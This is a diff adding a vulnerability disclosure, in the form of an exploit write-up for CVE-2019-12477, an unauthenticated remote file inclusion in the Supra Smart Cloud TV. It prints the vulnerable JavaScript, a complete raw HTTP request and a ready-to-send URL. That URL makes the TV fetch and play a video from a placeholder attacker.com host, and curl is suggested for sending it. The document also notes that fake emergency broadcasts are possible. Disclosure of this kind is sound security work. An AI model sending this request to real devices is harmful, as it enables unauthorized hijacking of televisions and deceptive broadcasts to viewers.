@@ -1,0 +1,59 @@
+Exploit Title: Remote file inclusion
+# Date: 03-06-2019
+# Exploit Author: Dhiraj Mishra
+# Vendor Homepage: https://supra.ru
+# Software Link: https://supra.ru/catalog/televizory/televizor_supra_stv_lc40lt0020f/
+# CVE: CVE-2019-12477
+# References:
+# https://nvd.nist.gov/vuln/detail/CVE-2019-12477
+# https://www.inputzero.io/2019/06/hacking-smart-tv.html
+
+Summary:
+Supra Smart Cloud TV allows remote file inclusion in the openLiveURL
+function, which allows a local attacker to broadcast fake video without any
+authentication via a /remote/media_control?action=setUri&uri=URI
+
+Technical Observation:
+We are abusing `openLiveURL()` which allows a local attacker to broadcast
+video on supra smart cloud TV. I found this vulnerability initially by
+source code review and then by crawling the application and reading every
+request helped me to trigger this vulnerability.
+
+Vulnerable code:
+
+     function openLiveTV(url)
+      {
+      $.get("/remote/media_control",
+{m_action:'setUri',m_uri:url,m_type:'video/*'},
+       function (data, textStatus){
+       if("success"==textStatus){
+        alert(textStatus);
+       }else
+       {
+        alert(textStatus);
+       }
+      });
+      }
+
+Vulnerable request:
+
+    GET /remote/media_control?action=setUri&uri=
+http://attacker.com/fake_broadcast_message.m3u8 HTTP/1.1
+    Host: 192.168.1.155
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0)
+Gecko/20100101 Firefox/66.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+To trigger the vulnerability you can send a crafted request to the URL,
+
+http://192.168.1.155/remote/media_control?action=setUri&uri=http://attacker.com/fake_broadcast_message.m3u8
+
+Although the above mention URL takes (.m3u8) format based video. We can use
+`curl -v -X GET` to send such request, typically this is an unauth remote
+file inclusion. An attacker could broadcast any video without any
+authentication, the worst case attacker could leverage this vulnerability
+to broadcast a fake emergency message.
